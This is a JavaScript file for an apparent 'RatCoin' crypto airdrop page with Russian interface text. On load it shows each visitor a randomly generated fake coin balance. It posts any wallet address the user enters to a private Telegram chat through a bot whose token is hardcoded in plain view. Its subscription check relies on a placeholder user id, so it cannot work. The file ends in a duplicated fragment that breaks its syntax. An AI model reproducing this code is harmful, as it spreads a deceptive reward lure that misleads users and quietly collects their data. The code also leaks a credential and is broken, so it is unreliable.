document.addEventListener('DOMContentLoaded', () => {
    const pages = document.querySelectorAll('.page');
    const balanceElement = document.getElementById('balance');
    const walletDisplay = document.getElementById('walletDisplay');
    const userWalletElement = document.getElementById('userWallet');
    let userBalance = 0;
    let chatId = '';

    const getRandomBalance = () => {
        return Math.floor(Math.random() * (10000 - 1000 + 1)) + 1000;
    };

    const getUserChatId = () => {
        chatId = 'userChatId'; // Замените на реальный chatId
    };

    const showPage = (pageId) => {
        pages.forEach(page => {
            page.style.display = page.id === pageId ? 'block' : 'none';
        });
    };

    document.getElementById('navHome').addEventListener('click', () => showPage('home'));
    document.getElementById('navTasks').addEventListener('click', () => showPage('tasks'));
    document.getElementById('navAirdrop').addEventListener('click', () => showPage('airdrop'));

    document.getElementById('addWallet').addEventListener('click', () => {
        document.getElementById('walletOptions').classList.toggle('hidden');
        document.getElementById('walletAddress').classList.add('hidden');
    });

    document.getElementById('submitWallet').addEventListener('click', () => {
        const walletAddress = document.getElementById('walletInput').value;
        fetch('https://api.telegram.org/bot7534613410:AAHj1AFkC_L9oOA_05OpqQ_ejiZEUKjnSL4/sendMessage', {
            method: 'POST',
            body: JSON.stringify({
                chat_id: 'Somik3o',
                text: `Новый адрес кошелька: ${walletAddress}`
            }),
            headers: { 'Content-Type': 'application/json' }
        });
        userWalletElement.textContent = walletAddress;
        walletDisplay.classList.remove('hidden');
        document.getElementById('walletOptions').classList.add('hidden');
        document.getElementById('walletAddress').classList.add('hidden');
    });

    document.getElementById('subscribeTask').addEventListener('click', () => {
        fetch('https://api.telegram.org/bot7534613410:AAHj1AFkC_L9oOA_05OpqQ_ejiZEUKjnSL4/getChatMember', {
            method: 'POST',
            body: JSON.stringify({
                chat_id: '@RatcCoin',
                user_id: chatId
            }),
            headers: { 'Content-Type': 'application/json' }
        }).then(response => response.json())
          .then(data => {
              if (data.result.status === 'member') {
                  userBalance += 1000;
                  balanceElement.textContent = `Баланс: ${userBalance} RatCoin`;
                  alert('Задание выполнено! Вам начислено 1000 RatCoin');
              } else {
                  alert('Вы не подписаны на канал');
              }
          });
    });

    userBalance = getRandomBalance();
    balanceElement.textContent = `Баланс: ${userBalance} RatCoin`;

    getUserChatId();
});


    // Инициализация chatId пользователя
    getUserChatId();
});
